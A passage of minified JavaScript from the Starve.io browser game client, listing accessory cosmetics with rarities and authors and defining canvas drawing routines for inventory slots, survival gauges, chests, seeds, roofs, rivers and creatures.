                            night: IMAGES.ACCESSORY82N,
                            rarity: RARITY.GOLD,
                            author: "upfiz",
                            name: "Skull Mask"
                        }, {
                            id: 9,
                            day: IMAGES.ACCESSORY1D,
                            night: IMAGES.ACCESSORY1N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Fancy Glasses"
                        }, {
                            id: 25,
                            day: IMAGES.ACCESSORY25D,
                            night: IMAGES.ACCESSORY25N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Medecin Mask"
                        }, {
                            id: 14,
                            day: IMAGES.ACCESSORY12D,
                            night: IMAGES.ACCESSORY12N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Mr. Mayor"
                        }, {
                            id: 19,
                            day: IMAGES.ACCESSORY19D,
                            night: IMAGES.ACCESSORY19N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Sunglasses 2"
                        }, {
                            id: 28,
                            day: IMAGES.ACCESSORY28D,
                            night: IMAGES.ACCESSORY28N,
                            rarity: RARITY.DIAMOND,
                            author: "pizza wa",
                            name: "Starfish"
                        }, {
                            id: 37,
                            day: IMAGES.ACCESSORY37D,
                            night: IMAGES.ACCESSORY37N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Berry"
                        }, {
                            id: 39,
                            day: IMAGES.ACCESSORY39D,
                            night: IMAGES.ACCESSORY39N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Flake"
                        }, {
                            id: 43,
                            day: IMAGES.ACCESSORY43D,
                            night: IMAGES.ACCESSORY43N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Leaf "
                        }, {
                            id: 61,
                            day: IMAGES.ACCESSORY49D,
                            night: IMAGES.ACCESSORY49N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "A sword in your head"
                        }, {
                            id: 62,
                            day: IMAGES.ACCESSORY51D,
                            night: IMAGES.ACCESSORY51N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Winter Scarf"
                        }, {
                            id: 64,
                            day: IMAGES.ACCESSORY53D,
                            night: IMAGES.ACCESSORY53N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Winter Scarf 2"
                        }, {
                            id: 66,
                            day: IMAGES.ACCESSORY54D,
                            night: IMAGES.ACCESSORY54N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Winter Scarf 3"
                        }, {
                            id: 70,
                            day: IMAGES.ACCESSORY58D,
                            night: IMAGES.ACCESSORY58N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Mask with animal tracks"
                        }, {
                            id: 71,
                            day: IMAGES.ACCESSORY59D,
                            night: IMAGES.ACCESSORY59N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Spring Mask"
                        }, {
                            id: 72,
                            day: IMAGES.ACCESSORY60D,
                            night: IMAGES.ACCESSORY60N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Pink Mask"
                        }, {
                            id: 73,
                            day: IMAGES.ACCESSORY61D,
                            night: IMAGES.ACCESSORY61N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Blue Mask"
                        }, {
                            id: 76,
                            day: IMAGES.ACCESSORY64D,
                            night: IMAGES.ACCESSORY64N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Military Mask"
                        }, {
                            id: 77,
                            day: IMAGES.ACCESSORY65D,
                            night: IMAGES.ACCESSORY65N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Orange Mask"
                        }, {
                            id: 78,
                            day: IMAGES.ACCESSORY66D,
                            night: IMAGES.ACCESSORY66N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "White and Red Points Mask"
                        }, {
                            id: 80,
                            day: IMAGES.ACCESSORY68D,
                            night: IMAGES.ACCESSORY68N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Stick out your tongue Mask"
                        }, {
                            id: 81,
                            day: IMAGES.ACCESSORY69D,
                            night: IMAGES.ACCESSORY69N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Two Teeth Mask"
                        }, {
                            id: 82,
                            day: IMAGES.ACCESSORY70D,
                            night: IMAGES.ACCESSORY70N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Make-up Mask"
                        }, {
                            id: 83,
                            day: IMAGES.ACCESSORY71D,
                            night: IMAGES.ACCESSORY71N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Sad Mask"
                        }, {
                            id: 84,
                            day: IMAGES.ACCESSORY72D,
                            night: IMAGES.ACCESSORY72N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Happy Mask"
                        }, {
                            id: 90,
                            day: IMAGES.ACCESSORY79D,
                            night: IMAGES.ACCESSORY79N,
                            rarity: RARITY.DIAMOND,
                            author: "aloner",
                            name: "Blood"
                        }, {
                            id: 27,
                            day: IMAGES.ACCESSORY27D,
                            night: IMAGES.ACCESSORY27N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Clown Face"
                        }, {
                            id: 20,
                            day: IMAGES.ACCESSORY20D,
                            night: IMAGES.ACCESSORY20N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Sunglasses 3"
                        }, {
                            id: 32,
                            day: IMAGES.ACCESSORY32D,
                            night: IMAGES.ACCESSORY32N,
                            rarity: RARITY.AMETHYST,
                            author: "eogito",
                            name: "Engineer's Glasses"
                        }, {
                            id: 33,
                            day: IMAGES.ACCESSORY33D,
                            night: IMAGES.ACCESSORY33N,
                            rarity: RARITY.AMETHYST,
                            author: "eogito",
                            name: "Engineer's Monocle"
                        }, {
                            id: 34,
                            day: IMAGES.ACCESSORY34D,
                            night: IMAGES.ACCESSORY34N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Mauve's butt"
                        }, {
                            id: 41,
                            day: IMAGES.ACCESSORY41D,
                            night: IMAGES.ACCESSORY41N,
                            rarity: RARITY.AMETHYST,
                            author: "eogito",
                            name: "Lapa Head"
                        }, {
                            id: 42,
                            day: IMAGES.ACCESSORY42D,
                            night: IMAGES.ACCESSORY42N,
                            rarity: RARITY.AMETHYST,
                            author: "eogito",
                            name: "Lapa Head "
                        }, {
                            id: 85,
                            day: IMAGES.ACCESSORY73D,
                            night: IMAGES.ACCESSORY73N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Mask and Glasses"
                        }, {
                            id: 60,
                            day: IMAGES.ACCESSORY48D,
                            night: IMAGES.ACCESSORY48N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Jason"
                        }, {
                            id: 26,
                            day: IMAGES.ACCESSORY26D,
                            night: IMAGES.ACCESSORY26N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Devil Horns"
                        }, {
                            id: 18,
                            day: IMAGES.ACCESSORY18D,
                            night: IMAGES.ACCESSORY18N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Big Boss"
                        }, {
                            id: 35,
                            day: IMAGES.ACCESSORY35D,
                            night: IMAGES.ACCESSORY35N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Baby Kraken"
                        }, {
                            id: 63,
                            day: IMAGES.ACCESSORY52D,
                            night: IMAGES.ACCESSORY52N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Deer Antlers"
                        }, {
                            id: 65,
                            day: IMAGES.ACCESSORY45D,
                            night: IMAGES.ACCESSORY45N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Baby Dragon on your head"
                        }, {
                            id: 86,
                            day: IMAGES.ACCESSORY74D,
                            night: IMAGES.ACCESSORY74N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Gaz Mask and Glasses"
                        }, {
                            id: 87,
                            day: IMAGES.ACCESSORY75D,
                            night: IMAGES.ACCESSORY75N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Pink Gaz Mask and Glasses"
                        }, {
                            id: 88,
                            day: IMAGES.ACCESSORY76D,
                            night: IMAGES.ACCESSORY76N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Engineer Glasses"
                        }, {
                            id: 45,
                            day: IMAGES.LEVEL5D,
                            night: IMAGES.LEVEL5N,
                            rarity: RARITY.LEVEL,
                            author: "Starve.io",
                            name: "More than Level 5",
                            level: 5
                        }, {
                            id: 46,
                            day: IMAGES.LEVEL10D,
                            night: IMAGES.LEVEL10N,
                            rarity: RARITY.LEVEL,
                            author: "Starve.io",
                            name: "More than Level 10",
                            level: 10
                        }, {
                            id: 47,
                            day: IMAGES.LEVEL15D,
                            night: IMAGES.LEVEL15N,
                            rarity: RARITY.LEVEL,
                            author: "Starve.io",
                            name: "More than Level 15",
                            level: 15
                        }, {
                            id: 48,
                            day: IMAGES.LEVEL20D,
                            night: IMAGES.LEVEL20N,
                            rarity: RARITY.LEVEL,
                            author: "Starve.io",
                            name: "More than Level 20",
                            level: 20
                        }, {
                            id: 49,
                            day: IMAGES.LEVEL25D,
                            night: IMAGES.LEVEL25N,
                            rarity: RARITY.LEVEL,
                            author: "Starve.io",
                            name: "More than Level 25",
                            level: 25
                        }, {
                            id: 50,
                            day: IMAGES.LEVEL30D,
                            night: IMAGES.LEVEL30N,
                            rarity: RARITY.LEVEL,
                            author: "Starve.io",
                            name: "More than Level 30",
                            level: 30
                        }, {
                            id: 51,
                            day: IMAGES.LEVEL35D,
                            night: IMAGES.LEVEL35N,
                            rarity: RARITY.LEVEL,
                            author: "Starve.io",
                            name: "More than Level 35",
                            level: 35
                        }, {
                            id: 52,
                            day: IMAGES.LEVEL40D,
                            night: IMAGES.LEVEL40N,
                            rarity: RARITY.LEVEL,
                            author: "Starve.io",
                            name: "More than Level 40",
                            level: 40
                        }, {
                            id: 53,
                            day: IMAGES.LEVEL45D,
                            night: IMAGES.LEVEL45N,
                            rarity: RARITY.LEVEL,
                            author: "Starve.io",
                            name: "More than Level 45",
                            level: 45
                        }, {
                            id: 54,
                            day: IMAGES.LEVEL50D,
                            night: IMAGES.LEVEL50N,
                            rarity: RARITY.LEVEL,
                            author: "Starve.io",
                            name: "More than Level 50",
                            level: 50
                        }, {
                            id: 55,
                            day: IMAGES.LEVEL55D,
                            night: IMAGES.LEVEL55N,
                            rarity: RARITY.LEVEL,
                            author: "Starve.io",
                            name: "More than Level 55",
                            level: 55
                        }, {
                            id: 56,
                            day: IMAGES.LEVEL60D,
                            night: IMAGES.LEVEL60N,
                            rarity: RARITY.LEVEL,
                            author: "Starve.io",
                            name: "More than Level 60",
                            level: 60
                        }]
                    },
                        Ue.ZOMBIE_SKIN = find_cosmetics_per_id(COSMETICS.SKIN, 21),
                        Ue.VAMPIRE_SKIN = find_cosmetics_per_id(COSMETICS.SKIN, 20),
                        sprite[ze.BODY] = [],
                        sprite[ze.HAND] = [],
                        sprite[ze.CRATE] = [],
                        sprite[ze.BOOK] = [],
                        sprite[ze.BAG] = [],
                        sprite[ze.ACCESSORY] = [];
                    for (var e = 0; e < COSMETICS.SKIN.length; e++)
                        sprite[ze.BODY][e] = [COSMETICS.SKIN[e].day, COSMETICS.SKIN[e].night],
                            sprite[ze.HAND][e] = [COSMETICS.SKIN[e].dayHand, COSMETICS.SKIN[e].nightHand];
                    for (e = 0; e < COSMETICS.BOOK.length; e++)
                        sprite[ze.BOOK][e] = [COSMETICS.BOOK[e].day, COSMETICS.BOOK[e].night];
                    for (e = 0; e < COSMETICS.CRATE.length; e++)
                        sprite[ze.CRATE][e] = [COSMETICS.CRATE[e].day, COSMETICS.CRATE[e].night];
                    for (e = 0; e < COSMETICS.BAG.length; e++)
                        sprite[ze.BAG][e] = [COSMETICS.BAG[e].day, COSMETICS.BAG[e].night];
                    for (e = 0; e < COSMETICS.ACCESSORY.length; e++)
                        sprite[ze.ACCESSORY][e] = [COSMETICS.ACCESSORY[e].day, COSMETICS.ACCESSORY[e].night]
                }
                ,
                INFO_BOX = [],
                PLAYER_LEVEL = [];
            var x0 = [];
            function J0() {
                for (var e, t, i = xe.inv, n = (Fe.fast_units[xe.uid],
                    0); n < i.can_select.length; n++) {
                    var r = i.can_select[n]
                        , o = !1
                        , a = ((a = Fe.fast_units[xe.uid]) && (a.right == r.id || a.clothe == r.id && 0 < a.clothe) ? (o = !0,
                            Ke(fe, r.info.img[2], r.info.translate.x, r.info.translate.y, r.info.width, r.info.height)) : r.draw(fe),
                            xe.inv.n[r.id])
                        , o = (1 < a && Y0(a, r),
                            0 < a && (a = n,
                                o = o,
                                t = e = void 0,
                                a = sprite[ze.SLOT_NUMBER][a],
                                e = r.info.translate.x + 5 * Pe,
                                t = r.info.translate.y + 5 * Pe,
                                r.info.state != Ce && !o || (t += 5 * Pe),
                                Ke(fe, a, e, t)),
                            xe.chest);
                    !o.open || !(o.id < 0 || o.id == r.id) || o.lock && o.pid != xe.id || Je.plus_buttons[r.id].draw(fe),
                        xe.furnace.open && Be.WOOD == r.id && Je.plus_buttons[r.id].draw(fe),
                        xe.well.open && Be.BUCKET_FULL == r.id && Je.plus_buttons[r.id].draw(fe),
                        xe.windmill.open && Be.WILD_WHEAT == r.id && Je.plus_buttons[r.id].draw(fe),
                        xe.extractor.open && Be.WOOD == r.id && Je.plus_buttons[r.id].draw(fe),
                        !xe.bread_oven.open || Be.WOOD != r.id && Be.FLOUR != r.id || Je.plus_buttons[r.id].draw(fe)
                }
                if (r && n < i.max) {
                    var s = sprite[ze.EMPTY_SLOT][2];
                    for (x = r.info.translate.x,
                        y = r.info.translate.y,
                        j = 1; n < i.max; n++,
                        j++)
                        Ke(fe, s, x + j * (s.width + 5), y)
                }
            }
            function X0() {
                fe.save();
                var e = Pe
                    , t = (xe.gauges.life.x < .25 && (fe.globalAlpha = xe.gauges.warn_life.v),
                        0 < xe.inv.can_select.length ? -70 : 0);
                (xe.chest.open || xe.furnace.open && -1 != xe.inv.find_item(Be.WOOD) || xe.windmill.open && -1 != xe.inv.find_item(Be.WILD_WHEAT) || xe.extractor.open && -1 != xe.inv.find_item(Be.WOOD) || xe.well.open && -1 != xe.inv.find_item(Be.BUCKET_FULL) || xe.bread_oven.open && (-1 != xe.inv.find_item(Be.WOOD) || -1 != xe.inv.find_item(Be.FLOUR))) && (t -= 50 * Pe),
                    fe.translate((Le - 950 * Pe) / 2, t),
                    fe.fillStyle = "#69A148",
                    fe.fillRect(this.translate.x + 37 * Pe, this.translate.y + 17 * Pe, 178 * xe.gauges.life.x * Pe, 18 * Pe),
                    fe.globalAlpha = 1,
                    xe.gauges.hunger.x < .35 && (fe.fillStyle = "#8F050A",
                        fe.globalAlpha = xe.gauges.warn_hunger.v,
                        fe.fillRect(this.translate.x + 277 * Pe, this.translate.y + 17 * Pe, 178 * Pe, 18 * Pe),
                        fe.globalAlpha = 1),
                    fe.fillStyle = "#AF352A",
                    fe.fillRect(this.translate.x + 277 * Pe, this.translate.y + 17 * Pe, 178 * xe.gauges.hunger.x * Pe, 18 * Pe),
                    xe.gauges.cold.x < .35 && (fe.fillStyle = "#366B91",
                        fe.globalAlpha = xe.gauges.warn_cold.v,
                        fe.fillRect(this.translate.x + 517 * Pe, this.translate.y + 17 * Pe, 178 * Pe, 18 * Pe),
                        fe.globalAlpha = 1),
                    fe.fillStyle = "#669BB1",
                    fe.fillRect(this.translate.x + 517 * Pe, this.translate.y + 17 * Pe, 178 * xe.gauges.cold.x * Pe, 18 * Pe),
                    .99 < xe.gauges.cold.x && (xe.gauges.warm.x < .35 && (fe.fillStyle = "#6C4036",
                        fe.globalAlpha = xe.gauges.warn_warm.v,
                        fe.fillRect(this.translate.x + 517 * Pe, this.translate.y + 17 * Pe, 178 * Pe, 18 * Pe),
                        fe.globalAlpha = 1),
                        fe.fillStyle = "#9C4036",
                        fe.fillRect(this.translate.x + 517 * Pe, this.translate.y + 17 * Pe, 178 * (1 - xe.gauges.warm.x) * Pe, 18 * Pe)),
                    xe.gauges.thirst.x < .35 && (fe.fillStyle = "#001A57",
                        fe.globalAlpha = xe.gauges.warn_thirst.v,
                        fe.fillRect(this.translate.x + 757 * Pe, this.translate.y + 17 * Pe, 178 * Pe, 18 * Pe),
                        fe.globalAlpha = 1),
                    fe.fillStyle = "#074A87",
                    fe.fillRect(this.translate.x + 757 * Pe, this.translate.y + 17 * Pe, 178 * xe.gauges.thirst.x * Pe, 18 * Pe),
                    Pe = e,
                    Ke(fe, this.img, this.translate.x, this.translate.y),
                    this.y = this.translate.y + t,
                    fe.restore(),
                    xe.gauges.oxygen.x < .99 && (e = Math.floor(ye - sprite[ze.OXYGEN].width / 2),
                        t += this.translate.y - sprite[ze.OXYGEN].height - 5 * Pe,
                        fe.fillStyle = "#BBE8EF",
                        fe.fillRect(e + 5, t + 5 * Pe, 588 * Pe * xe.gauges.oxygen.x, 10 * Pe),
                        xe.gauges.oxygen.x < .35 && (fe.fillStyle = "#9BA8AF",
                            fe.globalAlpha = xe.gauges.warn_oxygen.v,
                            fe.fillRect(e + 5, t + 5, 588 * Pe, 10 * Pe),
                            fe.globalAlpha = 1),
                        Ke(fe, sprite[ze.OXYGEN], e, t),
                        this.y = t)
            }
            function j0(e) {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    i = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        i = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        t = Math.cos(this.hit.angle - this.angle) * i,
                        Math.sin(this.hit.angle - this.angle) * i) : t = 0;
                var t, i, e = sprite[e][Fe.time];
                w = -e.width,
                    h = -e.height,
                    Ke(fe, e, -w / 2 + t, -h / 2 + i, w, h),
                    fe.restore()
            }
            function q0() {
                var e, t;
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        e = Math.cos(this.hit.angle - this.angle) * t,
                        Math.sin(this.hit.angle - this.angle) * t) : e = 0,
                    img = sprite[ze.CHEST][Fe.time],
                    w = -img.width,
                    h = -img.height,
                    Ke(fe, img, -w / 2 + e, -h / 2 + t, w, h),
                    this.lock && (img = sprite[ze.LOCK][Fe.time],
                        w = -img.width,
                        h = -img.height,
                        Ke(fe, img, -w / 2 + e - +Pe, -h / 2 + t, w, h)),
                    fe.restore()
            }
            function Z0() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    img = sprite[ze.THORNBUSH_SEED_MOB][Fe.time],
                    w = -img.width,
                    h = -img.height,
                    Ke(fe, img, -w / 2, -h / 2, w, h),
                    fe.restore()
            }
            function Q0() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    img = sprite[ze.GARLIC_SEED_MOB][Fe.time],
                    w = -img.width,
                    h = -img.height,
                    Ke(fe, img, -w / 2, -h / 2, w, h),
                    fe.restore()
            }
            function $0() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    img = sprite[ze.PUMPKIN_SEED_MOB][Fe.time],
                    w = -img.width,
                    h = -img.height,
                    Ke(fe, img, -w / 2, -h / 2, w, h),
                    fe.restore()
            }
            function en() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    img = sprite[ze.ALOE_VERA][Fe.time],
                    w = -img.width,
                    h = -img.height,
                    Ke(fe, img, -w / 2, -h / 2, w, h),
                    fe.restore()
            }
            function tn() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    img = sprite[ze.WHEAT_MOB][Fe.time],
                    w = -img.width,
                    h = -img.height,
                    Ke(fe, img, -w / 2, -h / 2, w, h),
                    fe.restore()
            }
            function nn(e) {
                var t, i;
                .8 < (e /= 100) || e <= 0 || (fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    i = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        i = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        t = Math.cos(this.hit.angle - this.angle) * i,
                        Math.sin(this.hit.angle - this.angle) * i) : t = 0,
                    fe.globalAlpha = .5,
                    t1(fe, t, i, 18 * Pe, e),
                    he(fe, null, "#000000", 18 * Pe),
                    fe.globalAlpha = 1,
                    t1(fe, t, i, 18 * Pe, e),
                    he(fe, null, ze.BROWN_LIFE[Fe.time], 6 * Pe),
                    fe.restore())
            }
            function rn(e) {
                var t, i;
                .95 < (e /= 100) || (fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    i = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        i = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        t = Math.cos(this.hit.angle - this.angle) * i,
                        Math.sin(this.hit.angle - this.angle) * i) : t = 0,
                    fe.globalAlpha = .5,
                    t1(fe, t, i, 28 * Pe, e),
                    he(fe, null, "#000000", 18 * Pe),
                    fe.globalAlpha = 1,
                    t1(fe, t, i, 28 * Pe, e),
                    he(fe, null, ze.CRAFT_LOADING[Fe.time], 6 * Pe),
                    fe.restore())
            }
            function on() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        e = Math.cos(this.hit.angle - this.angle) * t,
                        Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                var e, t, i = sprite[ze.ROOFS].length, i = (img = sprite[ze.ROOFS][(this.j + this.i % 2) % i][Fe.time],
                    w = -img.width,
                    h = -img.height,
                    Fe.fast_units[xe.uid]), i = (i && (xe.id === this.pid || xe.in_team(this.pid)) ? Utils.dist(this, i) < 550 ? this.opacity = Math.max(this.opacity - qe, .3) : this.opacity = Math.min(this.opacity + qe, 1) : i && Utils.dist(this, Fe.fast_units[xe.uid]) < 150 ? this.opacity = Math.max(this.opacity - qe, .3) : this.opacity = Math.min(this.opacity + qe, 1),
                        fe.globalAlpha);
                fe.globalAlpha *= this.opacity,
                    Ke(fe, img, -w / 2 + e, -h / 2 + t, w, h),
                    fe.globalAlpha = i,
                    fe.restore()
            }
            function an() {
                var e, t;
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        e = Math.cos(this.hit.angle - this.angle) * t,
                        Math.sin(this.hit.angle - this.angle) * t) : e = 0,
                    this.halo.update() && (this.color += .2 + .3 * Math.random()),
                    img = sprite[ze.GARLANDS][Math.floor(this.id + this.color) % 5][Fe.time],
                    w = -img.width * this.halo.v,
                    h = -img.height * this.halo.v,
                    Ke(fe, img, -w / 2 + e, -h / 2 + t, w, h),
                    fe.restore()
            }
            function sn(e) {
                var t, i;
                if (fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    i = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        i = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        t = Math.cos(this.hit.angle - this.angle) * i,
                        Math.sin(this.hit.angle - this.angle) * i) : t = 0,
                    e === ze.BED_TOP && !Fe.transition) {
                    for (var n = 0, r = Fe.units[Ye.PLAYERS], o = 0; o < r.length; o++) {
                        var a = Utils.dist(r[o], this);
                        if (a < 140 && 35 < a) {
                            n = 0;
                            break
                        }
                        a <= 35 && (n = 1)
                    }
                    this.opacity = 0 === n ? Math.max(.5, this.opacity - qe / 1.5) : Math.min(1, this.opacity + qe / 1.5),
                        fe.globalAlpha = this.opacity
                }
                img = sprite[e][Fe.time],
                    w = -img.width,
                    h = -img.height,
                    Ke(fe, img, -w / 2 + t, -h / 2 + i, w, h),
                    fe.globalAlpha = 1,
                    fe.restore()
            }
            function _n(e) {
                var t, i;
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    i = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        i = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        t = Math.cos(this.hit.angle - this.angle) * i,
                        Math.sin(this.hit.angle - this.angle) * i) : t = 0,
                    img = sprite[e][Fe.time],
                    w = -img.width,
                    h = -img.height,
                    Ke(fe, img, -w / 2 + t, -h / 2 + i, w, h),
                    fe.restore()
            }
            var En = 0;
            function un(e, t, i, n, r, o, a, s) {
                void 0 === s && (s = 0);
                for (var _ = e; _ <= t; _++)
                    for (var E = i; E <= n; E++) {
                        var u, d, T = Eo.tiles[_][E];
                        void 0 !== T && void 0 !== T[o] && (T = T[o],
                            u = sprite[r][Fe.time][T.river],
                            Ke(fe, u, xe.cam.x + T.x - u.width / (4 * _scale_object), xe.cam.y + T.y - u.height / (4 * _scale_object), u.width / (2 * _scale_object), u.height / (2 * _scale_object)),
                            Se.quality) && ((d = (1103515245 * (1e3 * _ + E) + 12345) % 2147483648 / 2147483648) < .2 ? (d = Math.floor(sprite[ze.RIVER_DECO][Fe.time][T.river].length * (5 * d)),
                                u = sprite[ze.RIVER_DECO][Fe.time][T.river][d],
                                Ke(fe, u, xe.cam.x + T.x - u.width / (4 * _scale_object), xe.cam.y + T.y - u.height / (4 * _scale_object), u.width / (2 * _scale_object), u.height / (2 * _scale_object))) : 0 !== T.current && (u = sprite[ze.RIVER_WAVE][Fe.time],
                                    d = (En + _ % 2 * 30) % 60,
                                    fe.globalAlpha = d < 30 ? d / 30 : 1 - (d - 30) / 30,
                                    Ke(fe, u, xe.cam.x + T.x - u.width / (4 * _scale_object), xe.cam.y + T.y - u.height / (4 * _scale_object) - 30 + d, u.width / (2 * _scale_object), u.height / (2 * _scale_object)),
                                    fe.globalAlpha = 1))
                    }
            }
            function dn() {
                var e;
                1 == (1 & this.info) ? this.dig = Math.min(this.dig + qe, 2.2) : (this.dig = Math.max(this.dig - qe, 0),
                    this.groundTimer += qe,
                    .1 < this.groundTimer && (this.groundTimer = 0,
                        e = {
                            x: this.x + 60 * Math.random() - 30,
                            y: this.y + 60 * Math.random() - 30,
                            a: 0,
                            r: 30 * Math.random() + 30
                        },
                        this.ground.push(e)));
                for (var t = 0; t < this.ground.length; t++) {
                    e = this.ground[t],
                        fe.save(),
                        fe.translate(xe.cam.x + e.x, xe.cam.y + e.y),
                        e.a = Math.min(1, e.a + qe / 2);
                    var i = e.a;
                    i < .2 ? i *= 5 : i = .8 < i ? 5 * (1 - i) : 1,
                        fe.globalAlpha = .8 * i,
                        ke(fe, 0, 0, e.r),
                        he(fe, ze.SAND_WORM_GROUND[Fe.time]),
                        fe.restore(),
                        1 === e.a && (this.ground.splice(t, 1),
                            t--)
                }
            }
            function Tn() {
                var e, t = void 0, i = void 0;
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    this.breath.update(),
                    this.rotate.update(),
                    .1 <= this.dig && this.dig <= 1.1 && ((e = Math.max(0, Math.min(1, this.dig - .1))) < .2 ? e *= 5 : e = .8 < e ? 5 * (1 - e) : 1,
                        t = sprite[ze.SAND_WORM1][Fe.time],
                        w = -t.width * this.breath.v,
                        h = -t.height * this.breath.v,
                        fe.globalAlpha = e,
                        Ke(fe, t, -w / 4, -h / 4, w / 2, h / 2),
                        i = sprite[ze.HURT_SAND_WORM1]),
                    .9 <= this.dig && ((e = Math.max(0, Math.min(1, this.dig - .9))) < .2 ? e *= 5 : e = 1,
                        t = sprite[ze.SAND_WORM2][Fe.time],
                        w = -t.width * this.breath.v,
                        h = -t.height * this.breath.v,
                        fe.globalAlpha = e,
                        Ke(fe, t, -w / 4, -h / 4, w / 2, h / 2),
                        i = sprite[ze.HURT_SAND_WORM2]),
                    this.action & R.HURT && void 0 !== i && (this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                        fe.globalAlpha = (.6 - this.hit.v) * e,
                        w = -i.width * this.breath.v,
                        h = -i.height * this.breath.v,
                        Ke(fe, i, -w / 4, -h / 4, w / 2, h / 2)),
                    fe.globalAlpha = 1,
                    fe.restore()
            }
            function An() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle);
                var e = Utils.dist(this, this.r);
                this.scale = 350 < e ? Math.min(this.scale + qe / 2, 1.8) : Math.max(this.scale - qe, 1),
                    this.breath.update(),
                    this.rotate.update(),
                    this._alpha = e < 350 ? Math.max(0, this._alpha - 2.2 * qe) : Math.min(1, this._alpha + 2.2 * qe),
                    e = sprite[ze.VULTURE_GROUND_ATTACK][Fe.time],
                    w = -e.width * this.breath.v * this.scale,
                    h = -e.height * this.breath.v * this.scale,
                    fe.globalAlpha = 1 - this._alpha,
                    Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
